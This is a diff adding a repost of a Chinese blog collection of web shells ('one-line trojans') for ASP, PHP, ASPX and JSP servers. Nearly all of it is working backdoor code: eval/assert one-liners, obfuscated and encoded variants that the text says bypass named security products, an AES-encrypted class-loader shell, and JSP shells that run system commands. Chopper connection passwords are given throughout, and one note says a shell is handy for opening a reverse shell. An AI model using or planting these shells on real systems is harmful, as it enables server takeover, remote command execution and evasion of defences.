@@ -1,0 +1,204 @@
+原文地址：https://www.cnblogs.com/JoEcO01/p/11556413.html 
+1、asp一句话木马：
+<%eval request(“x”)%>
+2、php一句话木马：
+<?php eval($_POST[g]);?>
+3、aspx一句话：
+<%@ Page Language=”Jscript”%><%eval(Request.Item["x"],”unsafe”);%>
+4、数据库加密一句话(密码a)：
+┼攠数畣整爠焕敌瑳∨≡┩忾
+5、网站配置、版权信息专用一句话：
+”%><%Eval Request(x)%>
+6、一句话再过护卫神：
+<%Y=request(“x”)%> <%execute(Y)%>
+7、过拦截一句话木马：
+<% eXEcGlOBaL ReQuEsT(“x”) %>
+8、asp闭合型一句话:
+%><%eval request(“0o1Znz1ow”)%><%
+9、能过安全狗的解析格式：
+;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg 
+10、突破安全狗的一句话：
+<%Y=request(“x”)%> <%eval(Y)%>
+11、elong过安全狗的php一句话：
+<?php $a = “a”.”s”.”s”.”e”.”r”.”t”; $a($_POST[cc]); ?>
+12、突破护卫神，保护盾一句话：
+<?php $a = str_replace(x,”",”axsxxsxexrxxt”);
+$a($_POST["test"]); ?>
+13、高强度php一句话：
+<?php substr(md5($_REQUEST['heroes']),28)==’acd0′&&eval($_REQUEST['c']);?>
+ 
+14、后台常用写入php一句话（密码x）：
+<?
+$fp = @fopen(“c.php”, ‘a’);
+f@fwrite($fp, ‘<’.'?php’.”\r\n\r\n”.’eval($_POST[x])’.”\r\n\r\n?”.”>\r\n”);
+@fclose($fp);
+?>
+ 
+15、许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。
+‘ E& Y; Y1 R$ s# ]. L$ c改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script
+这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的
+ 
+16、PHP高强度一句话：
+<?php substr(md5($_REQUEST['x']),28)==’acd0′&&eval($_REQUEST['c']);?> 菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c
+<?php assert($_REQUEST["c"]);?> 菜刀连接 躲避检测 密码：c
+ 
+17、突破安全狗的aspx的一句话：
+<%@ Page Language=”C#” ValidateRequest=”false” %>
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["你的密码"].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+ 
+ 18、php变异一句话：
+<?php ${"\x47L\x4f\x42\x41LS"}["\x6c\x68\x73l\x61wk"]="c";$kvbemdpsn="c";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x68\x78a\x77\x67\x6d\x6d\x70\x6c\x77o"]="b\x6b\x66";${"GLOBx41Lx53"}["x70txx75x76x74uijx6d"]="x76bl";${"\x47\x4c\x4fB\x41\x4c\x53"}["g\x6f\x6fl\x72\x7a"]="\x62\x6b\x66";${${"\x47\x4cO\x42\x41\x4c\x53"}["p\x74xu\x76\x74\x75\x69\x6a\x6d"]}=str_replace("\x74\x69","","\x74\x69st\x69t\x74ir\x74i\x5frt\x69\x65\x74\x69pl\x74i\x61t\x69\x63\x65");${${"G\x4cO\x42\x41\x4cS"}["\x68\x78\x61\x77gm\x6d\x70\x6c\x77\x6f"]}=${${"G\x4c\x4f\x42\x41\x4cS"}["\x70t\x78\x75\x76\x74\x75ijm"]}("\x6b","","\x6b\x62\x61k\x73\x6b\x65\x36\x6b\x34k\x5fkdk\x65\x6b\x63\x6b\x6f\x6b\x64ke");${${"\x47L\x4f\x42ALS"}["lh\x73\x6c\x61\x77\x6b"]}=${${"\x47\x4cO\x42A\x4c\x53"}["g\x6f\x6f\x6cr\x7a"]}("YX\x4ezZX\x49=").@$_GET["n"]."x74";@${$kvbemdpsn}($_POST["59f1f"]);echo "ax62cx61x62cabx63n";?>
+ 
+19、绕阿里云冰蝎php
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extend\u0073 ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
+ 
+20、JSP一句话收集
+<%
+if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
+%>
+在浏览器地址栏输入http://127.0.0.1:8080/222.jsp?f=1.txt&t=hello world
+然后再输入http://127.0.0.1:8080/test/1.txt
+ 
+21、jsp无回显执行系统命令：
+<%Runtime.getRuntime().exec(request.getParameter("i"));%>
+请求：http://127.0.0.1:8080/Shell/cmd2.jsp?i=ls
+执行之后不会有任何回显，用来反弹个shell很方便。
+ 
+22、jsp有回显带密码验证的:
+<%
+if("023".equals(request.getParameter("pwd"))){
+java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+int a = -1;
+byte[] b = new byte[2048];
+out.print("<pre>");
+while((a=in.read(b))!=-1){
+out.println(new String(b));
+}
+out.print("</pre>");
+}
+%>
+请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&i=ls
+ 
+23、JSP
+<%@ page contentType="text/html;charset=big5" session="false" import="java.io.*" %>
+<html>
+<head>
+<title></title>
+<meta http-equiv="Content-Type" content="text/html; charset=big5">
+</head>
+<body>
+<%
+Runtime runtime = Runtime.getRuntime();
+Process process =null;
+String line=null;
+InputStream is =null;
+InputStreamReader isr=null;
+BufferedReader br =null;
+String ip=request.getParameter("cmd");
+try
+{
+process =runtime.exec(ip);
+is = process.getInputStream();
+isr=new InputStreamReader(is);
+br =new BufferedReader(isr);
+out.println("<pre>");
+while( (line = br.readLine()) != null )
+{
+out.println(line);
+out.flush();
+}
+out.println("</pre>");
+is.close();
+isr.close();
+br.close();
+}
+catch(IOException e )
+{
+out.println(e);
+runtime.exit(1);
+}
+%>
+</body>
+</html>
+24、aspx木马收集：
+ 
+<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
+随日期变化的连接密码, Asp.NET服务端写法：
+<%@ Page Language="Jscript"%><%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format("{0:yyyyMMdd}",DateTime.Now.ToUniversalTime())+"37E4DD20C310142564FC483DB1132F36", "MD5").ToUpper()],"unsafe");%>
+例如：菜刀的密码为chopper，在前面加三个字符,新密码为：{D}chopper
+<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+ 
+
+ 
+<script runat="server" language="JScript">
+function popup(str) {
+var q = "u";
+var w = "afe";
+var a = q + "ns" + w;
+var b= eval(str,a);
+return(b);
+}
+</script>
+<%
+popup(popup(System.Text.Encoding.GetEncoding(65001).
+GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0="))));
+%>
+密码 z
+ 
+ 
+
+ 
+<%@ Page Language="Jscript" validateRequest="false" %>
+<%
+var keng 
+keng = Request.Item["never"];
+Response.Write(eval(keng,"unsafe"));
+%>
+ 
+
+ 
+<%@ Page Language = Jscript %>
+<%var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
+"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+
+"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+
+","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval
+(/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>
+密码 -7
+
+ 
+<%@PAGE LANGUAGE=JSCRIPT%>
+<%var PAY:String=Request["\x61\x62\x63\x64"];
+eval(PAY,"\x75\x6E\x73\x61"+"\x66\x65");
+%>
+密码 abcd
+
+ 
+<%@PAGE LANGUAGE=JSCRIPT%>
+<%var PAY:String=
+Request["\x61\x62\x63\x64"];eval
+(PAY,"\x75\x6E\x73\x61"+
+"\x66\x65");%>
+ 
+过狗过D盾一句话
+
+ 
+<%@ Page Language="Jscript" Debug=true%>
+<%
+var a=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5Gb3JtWyJwYXNzIl0="));
+var b=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("dW5zYWZl"));
+var c=eval(a,b);
+eval(c,b);
+%>
+ 
+
+ 
+<%@ Page Language="Jscript" Debug=true%>
+<%
+var a=Request.Form["pass"];
+var b="unsa",c="fe",d=b+c;
+function fun()
+{
+return a;
+}
+eval(fun(),d);
+%>
